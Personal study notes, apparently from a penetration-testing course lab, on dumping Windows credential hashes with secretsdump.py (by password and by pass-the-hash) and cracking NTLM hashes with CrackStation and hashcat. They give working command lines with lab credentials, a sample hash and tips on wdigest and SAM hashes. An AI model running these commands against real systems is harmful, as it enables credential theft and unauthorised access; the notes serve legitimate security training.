Dumping and Cracking Hashes

Tuesday, October 10, 2023

8:10 PM

 

-   Example with a password

    -   secretsdump.py MARVEL.local/fcastle:\'Password1\'@10.0.2.220

![](002_Dumping_and_Cracking_Hashes_000.png){width="11.635416666666666in" height="5.875in"}

-   Look out for wdigest also for older systems -can be forced on (make sure to flip off or you create a problem, more a last resort technique)

-   Look for clear text passwords and auto logon passwords

-   Sam hashes most important

 

Make sure to check all machines

![](002_Dumping_and_Cracking_Hashes_001.png){width="11.59375in" height="5.9375in"}

 

 

-   Example of secrets.py with hashes

    -   secretsdump.py administrator@10.0.2.221 -hashes aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b

![](002_Dumping_and_Cracking_Hashes_002.png){width="11.760416666666666in" height="5.895833333333333in"}

 

Thought process example

![](002_Dumping_and_Cracking_Hashes_003.png){width="14.84375in" height="1.7708333333333333in"}

 

 

 

-   Crack hash for NTLM all you need is NT portion (second part)

    -   aad3b435b51404eeaad3b435b51404ee:[64f12cddaa88057e06a81b54e73b949b]{.mark}

Crackstation example

[CrackStation - Online Password Hash Cracking - MD5, SHA1, Linux, Rainbow Tables, etc.](https://crackstation.net/)

![](002_Dumping_and_Cracking_Hashes_004.png){width="20.0in" height="10.822916666666666in"}

 

-   Cracking NTLM with hashcat example

    -   Remember you can use help in hashcat to find module needed- hashcat \--help \| grep NTLM

    -   Hashidentifier also

    -   Run with rockyou.txt hashcat -m1000 ntlm.txt /usr/share/wordlists/rockyou.txt

![](002_Dumping_and_Cracking_Hashes_005.png){width="17.5in" height="10.9375in"}

 
